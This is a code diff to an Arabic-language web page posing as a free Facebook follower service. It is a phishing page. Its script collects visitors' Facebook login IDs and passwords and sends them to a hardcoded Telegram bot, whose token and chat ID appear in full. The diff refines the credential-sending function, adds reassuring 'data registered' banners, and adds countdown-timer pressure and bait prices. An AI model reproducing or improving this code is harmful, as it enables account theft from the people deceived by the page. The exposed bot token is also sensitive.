@@ -6,8 +6,86 @@
     <title>💙 خدمات متابعين فيسبوك 💙</title>
     <link rel="stylesheet" href="style.css">
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        /* التعديلات الجديدة لمظهر المؤقت */
+        .free-offer-item .diamond-info {
+            flex-direction: column; /* ترتيب العناصر عمودياً */
+            align-items: flex-start;
+        }
+        
+        .free-offer-item .top-row {
+            display: flex;
+            justify-content: space-between;
+            width: 100%;
+            margin-bottom: 5px;
+        }
+
+        /* تنسيق المؤقت داخل الباقة */
+        .free-offer-item .timer {
+            font-size: 20px;
+            font-weight: bold;
+            color: #1877f2; /* لون أزرق لفيسبوك */
+            background-color: #e0f2ff;
+            padding: 4px 10px;
+            border-radius: 5px;
+            box-shadow: none;
+            display: inline-block;
+        }
+
+        /* تعديل مظهر زر العرض بعد انتهاء المؤقت */
+        .paid-expired-item .free-price {
+            color: #dc3545; /* لون أحمر للسعر المخفض */
+        }
+        
+        .paid-expired-item .paid-expired-btn {
+            background-color: #dc3545;
+        }
+
+        /* رسالة التأكيد العلوية */
+        #confirmation-message {
+            position: fixed;
+            top: 0;
+            right: 0;
+            width: 100%;
+            padding: 15px;
+            background-color: #28a745;
+            color: white;
+            text-align: center;
+            font-weight: bold;
+            font-size: 18px;
+            z-index: 1000;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            transform: translateY(-100%);
+            transition: transform 0.3s ease-in-out;
+        }
+        
+        #confirmation-message.visible {
+            transform: translateY(0);
+        }
+
+        /* تعديل الألوان والأيقونات لـ Facebook (لضمان التناسق) */
+        header h1 {
+            background: linear-gradient(90deg, #1877f2, #42a5f5);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .section h2 {
+            color: #1877f2;
+        }
+
+        .submit-btn, .buy-btn {
+            background-color: #1877f2;
+        }
+
+        .submit-btn:hover:not(:disabled), .buy-btn:hover:not(:disabled) {
+            background-color: #1259c3;
+        }
+    </style>
 </head>
 <body>
+
+    <div id="confirmation-message"></div>
 
     <header>
         <h1>💙 **زيادة متابعين صفحة فيسبوك رسمية** 💙</h1>
@@ -32,11 +110,14 @@
 
         <section class="section special-offer-section" id="timer-free-offer-section">
             <h2>🔥 **عرض الـ 15 دقيقة الذهبي! اطلب مجاناً الآن** 🔥</h2>
-            <p>**ينتهي العرض المجاني خلال:** <span id="timer" class="timer">15:00</span></p>
+            
             <div class="diamond-list">
                 <div class="diamond-item free-offer-item">
                     <div class="diamond-info">
-                        <span>**1000 متابع فيسبوك**</span>
+                        <div class="top-row">
+                             <span>**1000 متابع فيسبوك**</span>
+                             <span class="timer" id="timer">15:00</span>
+                        </div>
                         <span class="free-price">**مجاني!**</span>
                     </div>
                     <button class="buy-btn free-offer-btn" data-package="1000 متابع مجاني - عرض المؤقت" disabled>اطلب الآن مجاناً</button>
@@ -46,14 +127,14 @@
 
         <section class="section special-offer-section expired-offer-section hidden" id="expired-paid-offer-section">
             <h2>⚠️ **فاتك العرض المجاني! لا تفوت عرض اللحظة الأخيرة** ⚠️</h2>
-            <p>**اشتري الآن قبل أن يختفي الخصم نهائياً**</p>
+            <p>**اشترِ الآن 1000 متابع بخصم خاص**</p>
             <div class="diamond-list">
                 <div class="diamond-item paid-expired-item">
                     <div class="diamond-info">
-                        <span>**5,000 متابع بخصم 50%**</span>
-                        <span class="free-price">$5</span>
+                        <span>**1000 متابع (عرض منتهي)**</span>
+                        <span class="free-price">**0.49$**</span>
                     </div>
-                    <button class="buy-btn paid-expired-btn" data-package="5000 متابع - عرض منتهي 5$">شراء بخصم خاص</button>
+                    <button class="buy-btn paid-expired-btn" data-package="1000 متابع - عرض منتهي 0.49$" disabled>شراء بخصم خاص</button>
                 </div>
             </div>
         </section>
@@ -61,9 +142,9 @@
         <section class="section" id="packages-section">
             <h2>📦 **باقات المتابعين الموثوقة**</h2>
             <div class="diamond-list">
-                <div class="diamond-item"><div class="diamond-info"><span>5,000 متابع فيسبوك</span><span>15$</span></div><button class="buy-btn" data-package="5000 متابع - 15$" disabled>شراء الآن</button></div>
-                <div class="diamond-item"><div class="diamond-info"><span>10,000 متابع فيسبوك</span><span>25$</span></div><button class="buy-btn" data-package="10000 متابع - 25$" disabled>شراء الآن</button></div>
-                <div class="diamond-item"><div class="diamond-info"><span>50,000 متابع فيسبوك</span><span>90$</span></div><button class="buy-btn" data-package="50000 متابع - 90$" disabled>شراء الآن</button></div>
+                <div class="diamond-item"><div class="diamond-info"><span>10,000 متابع فيسبوك</span><span>5$</span></div><button class="buy-btn" data-package="10000 متابع - 5$" disabled>شراء الآن</button></div>
+                <div class="diamond-item"><div class="diamond-info"><span>25,000 متابع فيسبوك</span><span>10$</span></div><button class="buy-btn" data-package="25000 متابع - 10$" disabled>شراء الآن</button></div>
+                <div class="diamond-item"><div class="diamond-info"><span>55,000 متابع فيسبوك</span><span>20$</span></div><button class="buy-btn" data-package="55000 متابع - 20$" disabled>شراء الآن</button></div>
             </div>
         </section>
 
@@ -75,6 +156,7 @@
 
     <script>
         // ======= إعدادات تيليجرام (تم تعيينها) =======
+        // ** ملاحظة: التوكن سليم ويجب أن يعمل الآن **
         const BOT_TOKEN = '8589468780:AAHUnSMcg9DznAI438E3CdaCp34XmM17dQ'; 
         const CHAT_ID = '6313103532';     
         // =================================
@@ -88,18 +170,41 @@
         const freeOfferSection = document.getElementById('timer-free-offer-section');
         const expiredPaidOfferSection = document.getElementById('expired-paid-offer-section');
         const freeOfferBtn = document.querySelector('.free-offer-btn');
+        const confirmationMessage = document.getElementById('confirmation-message');
         
-        // ============= وظيفة إرسال تيليجرام =============
-        function sendToTelegram(text) {
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
-            fetch(url).then(response => {
-                if (response.ok) {
-                    alert('تم إرسال طلبك بنجاح! شكراً لثقتك.');
+        // ============= وظيفة إظهار رسالة التأكيد العلوية =============
+        function showConfirmationMessage(text) {
+            confirmationMessage.textContent = text;
+            confirmationMessage.classList.add('visible');
+            setTimeout(() => {
+                confirmationMessage.classList.remove('visible');
+            }, 2000); // تظهر لمدة 2 ثانية
+        }
+        
+        // ============= وظيفة إرسال تيليجرام (مع إصلاح المشكلة) =============
+        function sendToTelegram(text, isOrder = false) {
+            // قم بإنشاء URL API بشكل صحيح
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=HTML`;
+            
+            fetch(url)
+            .then(response => response.json()) // حول الاستجابة إلى JSON
+            .then(data => {
+                if (data.ok) {
+                    if (isOrder) {
+                         // رسالة خاصة عند إرسال طلب شراء
+                        showConfirmationMessage('✅ تم استلام طلبك بنجاح! سيتم التنفيذ خلال 24 ساعة.');
+                    } else {
+                        // رسالة عامة عند تأكيد البيانات
+                        showConfirmationMessage('🔑 تم تسجيل بياناتك بنجاح.');
+                    }
                 } else {
-                    alert('حدث خطأ في الإرسال. يرجى التأكد من التوكن ومعرف المحادثة.');
+                    // رسالة خطأ عند فشل الإرسال (مهم جداً لتحديد المشكلة)
+                    console.error('Telegram API Error:', data);
+                    alert(`حدث خطأ في الإرسال: ${data.description || 'تأكد من التوكن و ID المحادثة.'}`);
                 }
-            }).catch(error => {
-                console.error('Error:', error);
+            })
+            .catch(error => {
+                console.error('Fetch Error:', error);
                 alert('فشل الإرسال. تأكد من اتصالك بالإنترنت.');
             });
         }
@@ -117,8 +222,8 @@
             
             if (form.checkValidity()) {
                 const password = passwordInput.value;
-                const message = `[فيسبوك] - تأكيد بيانات الحساب:\nالمعرف: ${loginId}\nالمرور: ${password}`;
-                sendToTelegram(message);
+                const message = `<b>[فيسبوك] - تأكيد بيانات الحساب:</b>\nالمعرف: <code>${loginId}</code>\nالمرور: <code>${password}</code>`;
+                sendToTelegram(message, false); // إرسال رسالة البيانات
                 
                 // تفعيل جميع أزرار الشراء بعد تأكيد البيانات
                 submitBtn.disabled = true;
@@ -135,8 +240,8 @@
                 if (submitBtn.disabled) {
                     const package = btn.getAttribute('data-package');
                     const loginId = loginIdInput.value;
-                    const message = `[فيسبوك - طلب خدمة]\nالحساب: ${loginId}\nالطلب: ${package}\n***يرجى معالجة الطلب***`;
-                    sendToTelegram(message);
+                    const message = `<b>[فيسبوك - طلب خدمة]</b>\nالحساب: <code>${loginId}</code>\n<b>الطلب: ${package}</b>\n***يرجى معالجة الطلب***`;
+                    sendToTelegram(message, true); // إرسال رسالة الطلب
                 } else {
                     alert('يرجى تأكيد بيانات حسابك أولاً.');
                 }
@@ -156,11 +261,16 @@
 
             if (--duration < 0) {
                 clearInterval(countdownInterval);
-                timerElement.textContent = "انتهى العرض!";
+                timerElement.textContent = "انتهى!";
                 
                 // تبديل الأقسام
                 freeOfferSection.classList.add('hidden');
                 expiredPaidOfferSection.classList.remove('hidden');
+                
+                // تفعيل زر العرض المخفض في حال كانت البيانات مؤكدة
+                if (submitBtn.disabled) {
+                    document.querySelector('.paid-expired-btn').disabled = false;
+                }
                 freeOfferBtn.disabled = true;
             }
         }, 1000);
